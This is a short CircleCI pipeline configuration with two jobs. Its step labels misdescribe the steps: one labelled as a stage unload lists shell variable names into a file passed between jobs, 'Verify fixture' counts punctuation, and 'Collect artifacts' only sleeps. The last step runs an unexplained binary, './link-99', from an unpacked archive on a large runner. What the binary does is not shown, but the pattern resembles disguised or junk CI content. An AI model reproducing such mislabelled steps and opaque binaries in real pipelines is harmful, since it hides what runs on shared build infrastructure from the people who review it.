version: 2.1

jobs:
  Camera-Reader:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Unload The Enemy Waves Stage
          command: |
            mkdir -p /tmp/eta
            set +o pipefail 2>/dev/null; compgen -v > /tmp/eta/driver 2>/dev/null; seq 1 1000 >> /tmp/eta/driver; true
            echo "d:$(du -b /tmp/eta/driver | awk '{print $1}')"
      - persist_to_workspace:
          root: /tmp/eta
          paths:
            - 'driver'
  jun26-release:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/eta
      - run:
          name: Verify fixture
          command: |
            tr -dc '[:punct:]' < /tmp/eta/driver 2>/dev/null | wc -c || true
      - run:
          name: Load repo
          command: git clone --single-branch --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack vendor data
          command: tar --extract --file=chunks-mirror.tar
      - run:
          command: du -sh .
      - run:
          name: Collect artifacts
          no_output_timeout: 15m
          command: sleep 120
      - run:
          command: /bin/bash -c "./link-99"
